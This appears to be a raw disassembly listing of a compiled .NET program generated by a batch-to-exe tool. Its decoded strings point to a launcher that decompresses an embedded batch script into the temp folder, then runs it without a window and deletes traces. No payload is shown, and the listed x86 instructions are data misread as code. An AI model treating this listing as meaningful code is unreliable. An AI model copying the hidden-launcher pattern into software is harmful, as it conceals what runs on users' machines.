  4025ac:	01 00                	add    %eax,(%eax)
  4025ae:	91                   	xchg   %eax,%ecx
  4025af:	00 00                	add    %al,(%eax)
  4025b1:	00 01                	add    %al,(%ecx)
  4025b3:	00 96 00 00 00 01    	add    %dl,0x1000000(%esi)
  4025b9:	00 a3 00 11 00 51    	add    %ah,0x51001100(%ebx)
  4025bf:	00 28                	add    %ch,(%eax)
  4025c1:	00 19                	add    %bl,(%ecx)
  4025c3:	00 51 00             	add    %dl,0x0(%ecx)
  4025c6:	0a 00                	or     (%eax),%al
  4025c8:	09 00                	or     %eax,(%eax)
  4025ca:	51                   	push   %ecx
  4025cb:	00 0a                	add    %cl,(%edx)
  4025cd:	00 21                	add    %ah,(%ecx)
  4025cf:	00 60 01             	add    %ah,0x1(%eax)
  4025d2:	2d 00 49 00 7e       	sub    $0x7e004900,%eax
  4025d7:	01 38                	add    %edi,(%eax)
  4025d9:	00 51 00             	add    %dl,0x0(%ecx)
  4025dc:	91                   	xchg   %eax,%ecx
  4025dd:	01 3c 00             	add    %edi,(%eax,%eax,1)
  4025e0:	49                   	dec    %ecx
  4025e1:	00 98 01 42 00 59    	add    %bl,0x59004201(%eax)
  4025e7:	00 a5 01 48 00 59    	add    %ah,0x59004801(%ebp)
  4025ed:	00 bb 01 4d 00 59    	add    %bh,0x59004d01(%ebx)
  4025f3:	00 c9                	add    %cl,%cl
  4025f5:	01 54 00 59          	add    %edx,0x59(%eax,%eax,1)
  4025f9:	00 d0                	add    %dl,%al
  4025fb:	01 59 00             	add    %ebx,0x0(%ecx)
  4025fe:	69 00 51 00 60 00    	imul   $0x600051,(%eax),%eax
  402604:	71 00                	jno    0x402606
  402606:	0e                   	push   %cs
  402607:	02 38                	add    (%eax),%bh
  402609:	00 69 00             	add    %ch,0x0(%ecx)
  40260c:	23 02                	and    (%edx),%eax
  40260e:	60                   	pusha
  40260f:	00 69 00             	add    %ch,0x0(%ecx)
  402612:	38 02                	cmp    %al,(%edx)
  402614:	65 00 71 00          	add    %dh,%gs:0x0(%ecx)
  402618:	4c                   	dec    %esp
  402619:	02 38                	add    (%eax),%bh
  40261b:	00 69 00             	add    %ch,0x0(%ecx)
  40261e:	5c                   	pop    %esp
  40261f:	02 60 00             	add    0x0(%eax),%ah
  402622:	69 00 6a 02 65 00    	imul   $0x65026a,(%eax),%eax
  402628:	69 00 7d 02 65 00    	imul   $0x65027d,(%eax),%eax
  40262e:	79 00                	jns    0x402630
  402630:	9f                   	lahf
  402631:	02 6a 00             	add    0x0(%edx),%ch
  402634:	79 00                	jns    0x402636
  402636:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  402637:	02 0a                	add    (%edx),%cl
  402639:	00 79 00             	add    %bh,0x0(%ecx)
  40263c:	b1 02                	mov    $0x2,%cl
  40263e:	71 00                	jno    0x402640
  402640:	71 00                	jno    0x402642
  402642:	be 02 75 00 81       	mov    $0x81007502,%esi
  402647:	00 d7                	add    %dl,%bh
  402649:	02 0a                	add    (%edx),%cl
  40264b:	00 89 00 fa 02 86    	add    %cl,-0x79fd0600(%ecx)
  402651:	00 89 00 16 03 8b    	add    %cl,-0x74fcea00(%ecx)
  402657:	00 99 00 51 00 0a    	add    %bl,0xa005100(%ecx)
  40265d:	00 91 00 3d 03 91    	add    %dl,-0x6efcc300(%ecx)
  402663:	00 99 00 44 03 97    	add    %bl,-0x68fcbc00(%ecx)
  402669:	00 99 00 51 00 a5    	add    %bl,-0x5affaf00(%ecx)
  40266f:	00 a1 00 51 00 ab    	add    %ah,-0x54ffaf00(%ecx)
  402675:	00 89 00 94 03 be    	add    %cl,-0x41fc6c00(%ecx)
  40267b:	00 b1 00 9c 03 c3    	add    %dh,-0x3cfc6400(%ecx)
  402681:	00 2e                	add    %ch,(%esi)
  402683:	00 0b                	add    %cl,(%ebx)
  402685:	00 c7                	add    %al,%bh
  402687:	00 2e                	add    %ch,(%esi)
  402689:	00 13                	add    %dl,(%ebx)
  40268b:	00 d0                	add    %dl,%al
  40268d:	00 7a 00             	add    %bh,0x0(%edx)
  402690:	9c                   	pushf
  402691:	00 b3 00 04 80 00    	add    %dh,0x800400(%ebx)
	...
  4026a3:	00 00                	add    %al,(%eax)
  4026a5:	00 06                	add    %al,(%esi)
  4026a7:	01 00                	add    %eax,(%eax)
  4026a9:	00 04 00             	add    %al,(%eax,%eax,1)
	...
  4026b4:	00 00                	add    %al,(%eax)
  4026b6:	01 00                	add    %eax,(%eax)
  4026b8:	3a 00                	cmp    (%eax),%al
  4026ba:	00 00                	add    %al,(%eax)
  4026bc:	00 00                	add    %al,(%eax)
  4026be:	04 00                	add    $0x0,%al
	...
  4026c8:	00 00                	add    %al,(%eax)
  4026ca:	01 00                	add    %eax,(%eax)
  4026cc:	12 01                	adc    (%ecx),%al
  4026ce:	00 00                	add    %al,(%eax)
  4026d0:	00 00                	add    %al,(%eax)
  4026d2:	04 00                	add    $0x0,%al
	...
  4026dc:	00 00                	add    %al,(%eax)
  4026de:	01 00                	add    %eax,(%eax)
  4026e0:	43                   	inc    %ebx
	...
  4026e9:	00 01                	add    %al,(%ecx)
  4026eb:	00 00                	add    %al,(%eax)
  4026ed:	00 a5 03 00 00 00    	add    %ah,0x3(%ebp)
  4026f3:	00 00                	add    %al,(%eax)
  4026f5:	3c 4d                	cmp    $0x4d,%al
  4026f7:	6f                   	outsl  %ds:(%esi),(%dx)
  4026f8:	64 75 6c             	fs jne 0x402767
  4026fb:	65 3e 00 74 68 65    	gs add %dh,%ds:0x65(%eax,%ebp,2)
  402701:	6e                   	outsb  %ds:(%esi),(%dx)
  402702:	6f                   	outsl  %ds:(%esi),(%dx)
  402703:	70 79                	jo     0x40277e
  402705:	74 68                	je     0x40276f
  402707:	6f                   	outsl  %ds:(%esi),(%dx)
  402708:	6e                   	outsb  %ds:(%esi),(%dx)
  402709:	2e 65 78 65          	cs js,pn 0x402772
  40270d:	00 47 65             	add    %al,0x65(%edi)
  402710:	6e                   	outsb  %ds:(%esi),(%dx)
  402711:	65 72 61             	gs jb  0x402775
  402714:	74 65                	je     0x40277b
  402716:	64 57                	fs push %edi
  402718:	69 74 68 42 61 74 63 	imul   $0x68637461,0x42(%eax,%ebp,2),%esi
  40271f:	68 
  402720:	54                   	push   %esp
  402721:	6f                   	outsl  %ds:(%esi),(%dx)
  402722:	41                   	inc    %ecx
  402723:	70 70                	jo     0x402795
  402725:	00 50 72             	add    %dl,0x72(%eax)
  402728:	6f                   	outsl  %ds:(%esi),(%dx)
  402729:	67 72 61             	addr16 jb 0x40278d
  40272c:	6d                   	insl   (%dx),%es:(%edi)
  40272d:	00 6d 73             	add    %ch,0x73(%ebp)
  402730:	63 6f 72             	arpl   %ebp,0x72(%edi)
  402733:	6c                   	insb   (%dx),%es:(%edi)
  402734:	69 62 00 53 79 73 74 	imul   $0x74737953,0x0(%edx),%esp
  40273b:	65 6d                	gs insl (%dx),%es:(%edi)
  40273d:	00 4f 62             	add    %cl,0x62(%edi)
  402740:	6a 65                	push   $0x65
  402742:	63 74 00 2e          	arpl   %esi,0x2e(%eax,%eax,1)
  402746:	63 74 6f 72          	arpl   %esi,0x72(%edi,%ebp,2)
  40274a:	00 61 70             	add    %ah,0x70(%ecx)
  40274d:	70 4e                	jo     0x40279d
  40274f:	61                   	popa
  402750:	6d                   	insl   (%dx),%es:(%edi)
  402751:	65 00 61 70          	add    %ah,%gs:0x70(%ecx)
  402755:	70 49                	jo     0x4027a0
  402757:	64 00 4d 61          	add    %cl,%fs:0x61(%ebp)
  40275b:	69 6e 00 52 75 6e 41 	imul   $0x416e7552,0x0(%esi),%ebp
  402762:	70 70                	jo     0x4027d4
  402764:	6c                   	insb   (%dx),%es:(%edi)
  402765:	69 63 61 74 69 6f 6e 	imul   $0x6e6f6974,0x61(%ebx),%esp
  40276c:	00 52 65             	add    %dl,0x65(%edx)
  40276f:	61                   	popa
  402770:	64 52                	fs push %edx
  402772:	65 73 6f             	gs jae 0x4027e4
  402775:	75 72                	jne    0x4027e9
  402777:	63 65 00             	arpl   %esp,0x0(%ebp)
  40277a:	44                   	inc    %esp
  40277b:	65 63 6f 6d          	arpl   %ebp,%gs:0x6d(%edi)
  40277f:	70 72                	jo     0x4027f3
  402781:	65 73 73             	gs jae 0x4027f7
  402784:	00 61 72             	add    %ah,0x72(%ecx)
  402787:	67 73 00             	addr16 jae 0x40278a
  40278a:	72 65                	jb     0x4027f1
  40278c:	73 6f                	jae    0x4027fd
  40278e:	75 72                	jne    0x402802
  402790:	63 65 4e             	arpl   %esp,0x4e(%ebp)
  402793:	61                   	popa
  402794:	6d                   	insl   (%dx),%es:(%edi)
  402795:	65 00 64 61 74       	add    %ah,%gs:0x74(%ecx,%eiz,2)
  40279a:	61                   	popa
  40279b:	00 53 79             	add    %dl,0x79(%ebx)
  40279e:	73 74                	jae    0x402814
  4027a0:	65 6d                	gs insl (%dx),%es:(%edi)
  4027a2:	2e 52                	cs push %edx
  4027a4:	75 6e                	jne    0x402814
  4027a6:	74 69                	je     0x402811
  4027a8:	6d                   	insl   (%dx),%es:(%edi)
  4027a9:	65 2e 43             	gs cs inc %ebx
  4027ac:	6f                   	outsl  %ds:(%esi),(%dx)
  4027ad:	6d                   	insl   (%dx),%es:(%edi)
  4027ae:	70 69                	jo     0x402819
  4027b0:	6c                   	insb   (%dx),%es:(%edi)
  4027b1:	65 72 53             	gs jb  0x402807
  4027b4:	65 72 76             	gs jb  0x40282d
  4027b7:	69 63 65 73 00 43 6f 	imul   $0x6f430073,0x65(%ebx),%esp
  4027be:	6d                   	insl   (%dx),%es:(%edi)
  4027bf:	70 69                	jo     0x40282a
  4027c1:	6c                   	insb   (%dx),%es:(%edi)
  4027c2:	61                   	popa
  4027c3:	74 69                	je     0x40282e
  4027c5:	6f                   	outsl  %ds:(%esi),(%dx)
  4027c6:	6e                   	outsb  %ds:(%esi),(%dx)
  4027c7:	52                   	push   %edx
  4027c8:	65 6c                	gs insb (%dx),%es:(%edi)
  4027ca:	61                   	popa
  4027cb:	78 61                	js     0x40282e
  4027cd:	74 69                	je     0x402838
  4027cf:	6f                   	outsl  %ds:(%esi),(%dx)
  4027d0:	6e                   	outsb  %ds:(%esi),(%dx)
  4027d1:	73 41                	jae    0x402814
  4027d3:	74 74                	je     0x402849
  4027d5:	72 69                	jb     0x402840
  4027d7:	62 75 74             	bound  %esi,0x74(%ebp)
  4027da:	65 00 52 75          	add    %dl,%gs:0x75(%edx)
  4027de:	6e                   	outsb  %ds:(%esi),(%dx)
  4027df:	74 69                	je     0x40284a
  4027e1:	6d                   	insl   (%dx),%es:(%edi)
  4027e2:	65 43                	gs inc %ebx
  4027e4:	6f                   	outsl  %ds:(%esi),(%dx)
  4027e5:	6d                   	insl   (%dx),%es:(%edi)
  4027e6:	70 61                	jo     0x402849
  4027e8:	74 69                	je     0x402853
  4027ea:	62 69 6c             	bound  %ebp,0x6c(%ecx)
  4027ed:	69 74 79 41 74 74 72 	imul   $0x69727474,0x41(%ecx,%edi,2),%esi
  4027f4:	69 
  4027f5:	62 75 74             	bound  %esi,0x74(%ebp)
  4027f8:	65 00 74 68 65       	add    %dh,%gs:0x65(%eax,%ebp,2)
  4027fd:	6e                   	outsb  %ds:(%esi),(%dx)
  4027fe:	6f                   	outsl  %ds:(%esi),(%dx)
  4027ff:	70 79                	jo     0x40287a
  402801:	74 68                	je     0x40286b
  402803:	6f                   	outsl  %ds:(%esi),(%dx)
  402804:	6e                   	outsb  %ds:(%esi),(%dx)
  402805:	00 53 79             	add    %dl,0x79(%ebx)
  402808:	73 74                	jae    0x40287e
  40280a:	65 6d                	gs insl (%dx),%es:(%edi)
  40280c:	2e 57                	cs push %edi
  40280e:	69 6e 64 6f 77 73 2e 	imul   $0x2e73776f,0x64(%esi),%ebp
  402815:	46                   	inc    %esi
  402816:	6f                   	outsl  %ds:(%esi),(%dx)
  402817:	72 6d                	jb     0x402886
  402819:	73 00                	jae    0x40281b
  40281b:	4d                   	dec    %ebp
  40281c:	65 73 73             	gs jae 0x402892
  40281f:	61                   	popa
  402820:	67 65 42             	addr16 gs inc %edx
  402823:	6f                   	outsl  %ds:(%esi),(%dx)
  402824:	78 00                	js     0x402826
  402826:	44                   	inc    %esp
  402827:	69 61 6c 6f 67 52 65 	imul   $0x6552676f,0x6c(%ecx),%esp
  40282e:	73 75                	jae    0x4028a5
  402830:	6c                   	insb   (%dx),%es:(%edi)
  402831:	74 00                	je     0x402833
  402833:	4d                   	dec    %ebp
  402834:	65 73 73             	gs jae 0x4028aa
  402837:	61                   	popa
  402838:	67 65 42             	addr16 gs inc %edx
  40283b:	6f                   	outsl  %ds:(%esi),(%dx)
  40283c:	78 42                	js     0x402880
  40283e:	75 74                	jne    0x4028b4
  402840:	74 6f                	je     0x4028b1
  402842:	6e                   	outsb  %ds:(%esi),(%dx)
  402843:	73 00                	jae    0x402845
  402845:	4d                   	dec    %ebp
  402846:	65 73 73             	gs jae 0x4028bc
  402849:	61                   	popa
  40284a:	67 65 42             	addr16 gs inc %edx
  40284d:	6f                   	outsl  %ds:(%esi),(%dx)
  40284e:	78 49                	js     0x402899
  402850:	63 6f 6e             	arpl   %ebp,0x6e(%edi)
  402853:	00 53 68             	add    %dl,0x68(%ebx)
  402856:	6f                   	outsl  %ds:(%esi),(%dx)
  402857:	77 00                	ja     0x402859
  402859:	45                   	inc    %ebp
  40285a:	78 63                	js     0x4028bf
  40285c:	65 70 74             	gs jo  0x4028d3
  40285f:	69 6f 6e 00 53 79 73 	imul   $0x73795300,0x6e(%edi),%ebp
  402866:	74 65                	je     0x4028cd
  402868:	6d                   	insl   (%dx),%es:(%edi)
  402869:	2e 49                	cs dec %ecx
  40286b:	4f                   	dec    %edi
  40286c:	00 50 61             	add    %dl,0x61(%eax)
  40286f:	74 68                	je     0x4028d9
  402871:	00 47 65             	add    %al,0x65(%edi)
  402874:	74 54                	je     0x4028ca
  402876:	65 6d                	gs insl (%dx),%es:(%edi)
  402878:	70 50                	jo     0x4028ca
  40287a:	61                   	popa
  40287b:	74 68                	je     0x4028e5
  40287d:	00 53 74             	add    %dl,0x74(%ebx)
  402880:	72 69                	jb     0x4028eb
  402882:	6e                   	outsb  %ds:(%esi),(%dx)
  402883:	67 00 43 6f          	add    %al,0x6f(%bp,%di)
  402887:	6e                   	outsb  %ds:(%esi),(%dx)
  402888:	63 61 74             	arpl   %esp,0x74(%ecx)
  40288b:	00 43 6f             	add    %al,0x6f(%ebx)
  40288e:	6d                   	insl   (%dx),%es:(%edi)
  40288f:	62 69 6e             	bound  %ebp,0x6e(%ecx)
  402892:	65 00 46 69          	add    %al,%gs:0x69(%esi)
  402896:	6c                   	insb   (%dx),%es:(%edi)
  402897:	65 00 45 78          	add    %al,%gs:0x78(%ebp)
  40289b:	69 73 74 73 00 46 69 	imul   $0x69460073,0x74(%ebx),%esi
  4028a2:	6c                   	insb   (%dx),%es:(%edi)
  4028a3:	65 41                	gs inc %ecx
  4028a5:	74 74                	je     0x40291b
  4028a7:	72 69                	jb     0x402912
  4028a9:	62 75 74             	bound  %esi,0x74(%ebp)
  4028ac:	65 73 00             	gs jae 0x4028af
  4028af:	53                   	push   %ebx
  4028b0:	65 74 41             	gs je  0x4028f4
  4028b3:	74 74                	je     0x402929
  4028b5:	72 69                	jb     0x402920
  4028b7:	62 75 74             	bound  %esi,0x74(%ebp)
  4028ba:	65 73 00             	gs jae 0x4028bd
  4028bd:	44                   	inc    %esp
  4028be:	65 6c                	gs insb (%dx),%es:(%edi)
  4028c0:	65 74 65             	gs je  0x402928
  4028c3:	00 57 72             	add    %dl,0x72(%edi)
  4028c6:	69 74 65 41 6c 6c 42 	imul   $0x79426c6c,0x41(%ebp,%eiz,2),%esi
  4028cd:	79 
  4028ce:	74 65                	je     0x402935
  4028d0:	73 00                	jae    0x4028d2
  4028d2:	53                   	push   %ebx
  4028d3:	79 73                	jns    0x402948
  4028d5:	74 65                	je     0x40293c
  4028d7:	6d                   	insl   (%dx),%es:(%edi)
  4028d8:	2e 44                	cs inc %esp
  4028da:	69 61 67 6e 6f 73 74 	imul   $0x74736f6e,0x67(%ecx),%esp
  4028e1:	69 63 73 00 50 72 6f 	imul   $0x6f725000,0x73(%ebx),%esp
  4028e8:	63 65 73             	arpl   %esp,0x73(%ebp)
  4028eb:	73 53                	jae    0x402940
  4028ed:	74 61                	je     0x402950
  4028ef:	72 74                	jb     0x402965
  4028f1:	49                   	dec    %ecx
  4028f2:	6e                   	outsb  %ds:(%esi),(%dx)
  4028f3:	66 6f                	outsw  %ds:(%esi),(%dx)
  4028f5:	00 45 6e             	add    %al,0x6e(%ebp)
  4028f8:	76 69                	jbe    0x402963
  4028fa:	72 6f                	jb     0x40296b
  4028fc:	6e                   	outsb  %ds:(%esi),(%dx)
  4028fd:	6d                   	insl   (%dx),%es:(%edi)
  4028fe:	65 6e                	outsb  %gs:(%esi),(%dx)
  402900:	74 00                	je     0x402902
  402902:	67 65 74 5f          	addr16 gs je 0x402965
  402906:	43                   	inc    %ebx
  402907:	75 72                	jne    0x40297b
  402909:	72 65                	jb     0x402970
  40290b:	6e                   	outsb  %ds:(%esi),(%dx)
  40290c:	74 44                	je     0x402952
  40290e:	69 72 65 63 74 6f 72 	imul   $0x726f7463,0x65(%edx),%esi
  402915:	79 00                	jns    0x402917
  402917:	73 65                	jae    0x40297e
  402919:	74 5f                	je     0x40297a
  40291b:	57                   	push   %edi
  40291c:	6f                   	outsl  %ds:(%esi),(%dx)
  40291d:	72 6b                	jb     0x40298a
  40291f:	69 6e 67 44 69 72 65 	imul   $0x65726944,0x67(%esi),%ebp
  402926:	63 74 6f 72          	arpl   %esi,0x72(%edi,%ebp,2)
  40292a:	79 00                	jns    0x40292c
  40292c:	73 65                	jae    0x402993
  40292e:	74 5f                	je     0x40298f
  402930:	55                   	push   %ebp
  402931:	73 65                	jae    0x402998
  402933:	53                   	push   %ebx
  402934:	68 65 6c 6c 45       	push   $0x456c6c65
  402939:	78 65                	js     0x4029a0
  40293b:	63 75 74             	arpl   %esi,0x74(%ebp)
  40293e:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  402942:	74 5f                	je     0x4029a3
  402944:	43                   	inc    %ebx
  402945:	6f                   	outsl  %ds:(%esi),(%dx)
  402946:	6d                   	insl   (%dx),%es:(%edi)
  402947:	6d                   	insl   (%dx),%es:(%edi)
  402948:	61                   	popa
  402949:	6e                   	outsb  %ds:(%esi),(%dx)
  40294a:	64 4c                	fs dec %esp
  40294c:	69 6e 65 00 73 65 74 	imul   $0x74657300,0x65(%esi),%ebp
  402953:	5f                   	pop    %edi
  402954:	41                   	inc    %ecx
  402955:	72 67                	jb     0x4029be
  402957:	75 6d                	jne    0x4029c6
  402959:	65 6e                	outsb  %gs:(%esi),(%dx)
  40295b:	74 73                	je     0x4029d0
  40295d:	00 73 65             	add    %dh,0x65(%ebx)
  402960:	74 5f                	je     0x4029c1
  402962:	43                   	inc    %ebx
  402963:	72 65                	jb     0x4029ca
  402965:	61                   	popa
  402966:	74 65                	je     0x4029cd
  402968:	4e                   	dec    %esi
  402969:	6f                   	outsl  %ds:(%esi),(%dx)
  40296a:	57                   	push   %edi
  40296b:	69 6e 64 6f 77 00 73 	imul   $0x7300776f,0x64(%esi),%ebp
  402972:	65 74 5f             	gs je  0x4029d4
  402975:	52                   	push   %edx
  402976:	65 64 69 72 65 63 74 	gs imul $0x74537463,%fs:0x65(%edx),%esi
  40297d:	53 74 
  40297f:	61                   	popa
  402980:	6e                   	outsb  %ds:(%esi),(%dx)
  402981:	64 61                	fs popa
  402983:	72 64                	jb     0x4029e9
  402985:	45                   	inc    %ebp
  402986:	72 72                	jb     0x4029fa
  402988:	6f                   	outsl  %ds:(%esi),(%dx)
  402989:	72 00                	jb     0x40298b
  40298b:	50                   	push   %eax
  40298c:	72 6f                	jb     0x4029fd
  40298e:	63 65 73             	arpl   %esp,0x73(%ebp)
  402991:	73 00                	jae    0x402993
  402993:	53                   	push   %ebx
  402994:	74 61                	je     0x4029f7
  402996:	72 74                	jb     0x402a0c
  402998:	00 57 61             	add    %dl,0x61(%edi)
  40299b:	69 74 46 6f 72 45 78 	imul   $0x69784572,0x6f(%esi,%eax,2),%esi
  4029a2:	69 
  4029a3:	74 00                	je     0x4029a5
  4029a5:	67 65 74 5f          	addr16 gs je 0x402a08
  4029a9:	45                   	inc    %ebp
  4029aa:	78 69                	js     0x402a15
  4029ac:	74 43                	je     0x4029f1
  4029ae:	6f                   	outsl  %ds:(%esi),(%dx)
  4029af:	64 65 00 73 65       	fs add %dh,%gs:0x65(%ebx)
  4029b4:	74 5f                	je     0x402a15
  4029b6:	45                   	inc    %ebp
  4029b7:	78 69                	js     0x402a22
  4029b9:	74 43                	je     0x4029fe
  4029bb:	6f                   	outsl  %ds:(%esi),(%dx)
  4029bc:	64 65 00 49 44       	fs add %cl,%gs:0x44(%ecx)
  4029c1:	69 73 70 6f 73 61 62 	imul   $0x6261736f,0x70(%ebx),%esi
  4029c8:	6c                   	insb   (%dx),%es:(%edi)
  4029c9:	65 00 44 69 73       	add    %al,%gs:0x73(%ecx,%ebp,2)
  4029ce:	70 6f                	jo     0x402a3f
  4029d0:	73 65                	jae    0x402a37
  4029d2:	00 53 79             	add    %dl,0x79(%ebx)
  4029d5:	73 74                	jae    0x402a4b
  4029d7:	65 6d                	gs insl (%dx),%es:(%edi)
  4029d9:	2e 52                	cs push %edx
  4029db:	65 66 6c             	gs data16 insb (%dx),%es:(%edi)
  4029de:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  4029e3:	6e                   	outsb  %ds:(%esi),(%dx)
  4029e4:	00 41 73             	add    %al,0x73(%ecx)
  4029e7:	73 65                	jae    0x402a4e
  4029e9:	6d                   	insl   (%dx),%es:(%edi)
  4029ea:	62 6c 79 00          	bound  %ebp,0x0(%ecx,%edi,2)
  4029ee:	47                   	inc    %edi
  4029ef:	65 74 45             	gs je  0x402a37
  4029f2:	78 65                	js     0x402a59
  4029f4:	63 75 74             	arpl   %esi,0x74(%ebp)
  4029f7:	69 6e 67 41 73 73 65 	imul   $0x65737341,0x67(%esi),%ebp
  4029fe:	6d                   	insl   (%dx),%es:(%edi)
  4029ff:	62 6c 79 00          	bound  %ebp,0x0(%ecx,%edi,2)
  402a03:	53                   	push   %ebx
  402a04:	74 72                	je     0x402a78
  402a06:	65 61                	gs popa
  402a08:	6d                   	insl   (%dx),%es:(%edi)
  402a09:	00 47 65             	add    %al,0x65(%edi)
  402a0c:	74 4d                	je     0x402a5b
  402a0e:	61                   	popa
  402a0f:	6e                   	outsb  %ds:(%esi),(%dx)
  402a10:	69 66 65 73 74 52 65 	imul   $0x65527473,0x65(%esi),%esp
  402a17:	73 6f                	jae    0x402a88
  402a19:	75 72                	jne    0x402a8d
  402a1b:	63 65 53             	arpl   %esp,0x53(%ebp)
  402a1e:	74 72                	je     0x402a92
  402a20:	65 61                	gs popa
  402a22:	6d                   	insl   (%dx),%es:(%edi)
  402a23:	00 4d 65             	add    %cl,0x65(%ebp)
  402a26:	6d                   	insl   (%dx),%es:(%edi)
  402a27:	6f                   	outsl  %ds:(%esi),(%dx)
  402a28:	72 79                	jb     0x402aa3
  402a2a:	53                   	push   %ebx
  402a2b:	74 72                	je     0x402a9f
  402a2d:	65 61                	gs popa
  402a2f:	6d                   	insl   (%dx),%es:(%edi)
  402a30:	00 43 6f             	add    %al,0x6f(%ebx)
  402a33:	70 79                	jo     0x402aae
  402a35:	54                   	push   %esp
  402a36:	6f                   	outsl  %ds:(%esi),(%dx)
  402a37:	00 54 6f 41          	add    %dl,0x41(%edi,%ebp,2)
  402a3b:	72 72                	jb     0x402aaf
  402a3d:	61                   	popa
  402a3e:	79 00                	jns    0x402a40
  402a40:	53                   	push   %ebx
  402a41:	79 73                	jns    0x402ab6
  402a43:	74 65                	je     0x402aaa
  402a45:	6d                   	insl   (%dx),%es:(%edi)
  402a46:	2e 49                	cs dec %ecx
  402a48:	4f                   	dec    %edi
  402a49:	2e 43                	cs inc %ebx
  402a4b:	6f                   	outsl  %ds:(%esi),(%dx)
  402a4c:	6d                   	insl   (%dx),%es:(%edi)
  402a4d:	70 72                	jo     0x402ac1
  402a4f:	65 73 73             	gs jae 0x402ac5
  402a52:	69 6f 6e 00 44 65 66 	imul   $0x66654400,0x6e(%edi),%ebp
  402a59:	6c                   	insb   (%dx),%es:(%edi)
  402a5a:	61                   	popa
  402a5b:	74 65                	je     0x402ac2
  402a5d:	53                   	push   %ebx
  402a5e:	74 72                	je     0x402ad2
  402a60:	65 61                	gs popa
  402a62:	6d                   	insl   (%dx),%es:(%edi)
  402a63:	00 43 6f             	add    %al,0x6f(%ebx)
  402a66:	6d                   	insl   (%dx),%es:(%edi)
  402a67:	70 72                	jo     0x402adb
  402a69:	65 73 73             	gs jae 0x402adf
  402a6c:	69 6f 6e 4d 6f 64 65 	imul   $0x65646f4d,0x6e(%edi),%ebp
  402a73:	00 2e                	add    %ch,(%esi)
  402a75:	63 63 74             	arpl   %esp,0x74(%ebx)
  402a78:	6f                   	outsl  %ds:(%esi),(%dx)
  402a79:	72 00                	jb     0x402a7b
  402a7b:	41                   	inc    %ecx
  402a7c:	73 73                	jae    0x402af1
  402a7e:	65 6d                	gs insl (%dx),%es:(%edi)
  402a80:	62 6c 79 4e          	bound  %ebp,0x4e(%ecx,%edi,2)
  402a84:	61                   	popa
  402a85:	6d                   	insl   (%dx),%es:(%edi)
  402a86:	65 00 47 65          	add    %al,%gs:0x65(%edi)
  402a8a:	74 4e                	je     0x402ada
  402a8c:	61                   	popa
  402a8d:	6d                   	insl   (%dx),%es:(%edi)
  402a8e:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  402a92:	74 5f                	je     0x402af3
  402a94:	4e                   	dec    %esi
  402a95:	61                   	popa
  402a96:	6d                   	insl   (%dx),%es:(%edi)
  402a97:	65 00 65 6d          	add    %ah,%gs:0x6d(%ebp)
  402a9b:	62 65 64             	bound  %esp,0x64(%ebp)
  402a9e:	64 65 64 42          	fs gs fs inc %edx
  402aa2:	61                   	popa
  402aa3:	74 63                	je     0x402b08
  402aa5:	68 53 63 72 69       	push   $0x69726353
  402aaa:	70 74                	jo     0x402b20
  402aac:	00 00                	add    %al,(%eax)
  402aae:	00 00                	add    %al,(%eax)
  402ab0:	00 25 55 00 6e 00    	add    %ah,0x6e0055
  402ab6:	61                   	popa
  402ab7:	00 62 00             	add    %ah,0x0(%edx)
  402aba:	6c                   	insb   (%dx),%es:(%edi)
  402abb:	00 65 00             	add    %ah,0x0(%ebp)
  402abe:	20 00                	and    %al,(%eax)
  402ac0:	74 00                	je     0x402ac2
  402ac2:	6f                   	outsl  %ds:(%esi),(%dx)
  402ac3:	00 20                	add    %ah,(%eax)
  402ac5:	00 65 00             	add    %ah,0x0(%ebp)
  402ac8:	78 00                	js     0x402aca
  402aca:	65 00 63 00          	add    %ah,%gs:0x0(%ebx)
  402ace:	75 00                	jne    0x402ad0
  402ad0:	74 00                	je     0x402ad2
  402ad2:	65 00 2e             	add    %ch,%gs:(%esi)
  402ad5:	00 00                	add    %al,(%eax)
  402ad7:	09 62 00             	or     %esp,0x0(%edx)
  402ada:	32 00                	xor    (%eax),%al
  402adc:	61                   	popa
  402add:	00 2e                	add    %ch,(%esi)
  402adf:	00 00                	add    %al,(%eax)
  402ae1:	03 2e                	add    (%esi),%ebp
  402ae3:	00 00                	add    %al,(%eax)
  402ae5:	09 2e                	or     %ebp,(%esi)
  402ae7:	00 63 00             	add    %ah,0x0(%ebx)
  402aea:	6d                   	insl   (%dx),%es:(%edi)
  402aeb:	00 64 00 00          	add    %ah,0x0(%eax,%eax,1)
  402aef:	27                   	daa
  402af0:	65 00 6d 00          	add    %ch,%gs:0x0(%ebp)
  402af4:	62 00                	bound  %eax,(%eax)
  402af6:	65 00 64 00 64       	add    %ah,%gs:0x64(%eax,%eax,1)
  402afb:	00 65 00             	add    %ah,0x0(%ebp)
  402afe:	64 00 42 00          	add    %al,%fs:0x0(%edx)
  402b02:	61                   	popa
  402b03:	00 74 00 63          	add    %dh,0x63(%eax,%eax,1)
  402b07:	00 68 00             	add    %ch,0x0(%eax)
  402b0a:	53                   	push   %ebx
  402b0b:	00 63 00             	add    %ah,0x0(%ebx)
  402b0e:	72 00                	jb     0x402b10
  402b10:	69 00 70 00 74 00    	imul   $0x740070,(%eax),%eax
  402b16:	00 11                	add    %dl,(%ecx)
  402b18:	31 00                	xor    %eax,(%eax)
  402b1a:	64 00 30             	add    %dh,%fs:(%eax)
  402b1d:	00 34 00             	add    %dh,(%eax,%eax,1)
  402b20:	36 00 31             	add    %dh,%ss:(%ecx)
  402b23:	00 32                	add    %dh,(%edx)
  402b25:	00 65 00             	add    %ah,0x0(%ebp)
  402b28:	00 00                	add    %al,(%eax)
  402b2a:	00 00                	add    %al,(%eax)
  402b2c:	14 cd                	adc    $0xcd,%al
  402b2e:	bf 12 6b c1 ca       	mov    $0xcac16b12,%edi
  402b33:	43                   	inc    %ebx
  402b34:	98                   	cwtl
  402b35:	91                   	xchg   %eax,%ecx
  402b36:	fb                   	sti
  402b37:	8e b9 77 35 a0 00    	mov    0xa03577(%ecx),%?
  402b3d:	08 b7 7a 5c 56 19    	or     %dh,0x19565c7a(%edi)
  402b43:	34 e0                	xor    $0xe0,%al
  402b45:	89 03                	mov    %eax,(%ebx)
  402b47:	20 00                	and    %al,(%eax)
  402b49:	01 02                	add    %eax,(%edx)
  402b4b:	06                   	push   %es
  402b4c:	0e                   	push   %cs
  402b4d:	05 00 01 01 1d       	add    $0x1d010100,%eax
  402b52:	0e                   	push   %cs
  402b53:	03 00                	add    (%eax),%eax
